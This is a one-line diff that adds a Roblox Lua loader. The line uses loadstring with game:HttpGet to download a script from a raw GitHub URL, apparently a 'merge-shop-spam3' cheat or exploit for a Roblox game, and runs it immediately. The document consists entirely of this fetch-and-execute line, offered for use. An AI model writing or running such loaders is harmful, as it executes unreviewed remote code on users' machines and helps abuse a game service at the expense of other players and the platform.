@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/merge-shop-spam3-vgc4o504o0v4sl.lua"))()
